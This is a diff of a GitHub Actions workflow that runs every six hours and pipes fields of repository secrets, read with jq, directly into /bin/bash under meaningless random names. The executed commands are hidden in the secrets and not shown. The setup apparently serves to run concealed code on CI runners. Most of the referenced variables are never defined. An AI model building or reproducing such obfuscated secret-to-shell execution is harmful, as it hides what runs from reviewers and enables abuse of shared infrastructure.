@@ -1,23 +1,37 @@
 name: yaofandui4567
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 2/6 * * *'
-
-jobs:  # 18478
+    - cron: '41 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: yaofandui4567
         env:
-          lum1091: ${{ secrets.lum1091 }}
+          dbdr1: ${{ secrets.dbdr1 }}
         run: |
-          echo $lum1091 | jq -r .dpfby51 | /bin/bash
-          echo $q101 | jq -r .deh58 | /bin/bash
-          echo $cnb64748 | jq -r .kbj86082 | /bin/bash
-          echo $jqqh80195 | jq -r .fibe7047 | /bin/bash
-          echo $ilcyd72 | jq -r .schm61 | /bin/bash
-          echo $ave28 | jq -r .rnl0055 | /bin/bash
+          echo $dbdr1 | jq -r .ljhxh98 | /bin/bash
+          echo $uwnrj075 | jq -r .dmb53591 | /bin/bash
+          echo $u4 | jq -r .rl7012 | /bin/bash
+          echo $his4240 | jq -r .l848 | /bin/bash
+          echo $qpmme07709 | jq -r .hmc0450 | /bin/bash
+          echo $v759 | jq -r .qi6619 | /bin/bash
+          echo $zhwk6046 | jq -r .ewm07 | /bin/bash
+          echo $mvv71527 | jq -r .dv65054 | /bin/bash
+          echo $znn72139 | jq -r .uo146 | /bin/bash
+          echo $esiso96425 | jq -r .rk03 | /bin/bash
+          echo $gpvad2447 | jq -r .xwkye4038 | /bin/bash
+          echo $lx8 | jq -r .xwcz13886 | /bin/bash
+          echo $nuyzf655 | jq -r .huu1910 | /bin/bash
+          echo $t10121 | jq -r .f78 | /bin/bash
+          echo $lzfj32175 | jq -r .yo33661 | /bin/bash
+          echo $tqhw9 | jq -r .lhrrp4247 | /bin/bash
+          echo $idptl7 | jq -r .o2317 | /bin/bash
+          echo $awuq56563 | jq -r .a7568 | /bin/bash
+          echo $v810 | jq -r .zuc46 | /bin/bash
+          echo $oxdyt9413 | jq -r .q88997 | /bin/bash
+          echo $itmp7 | jq -r .qrwfi4508 | /bin/bash
 
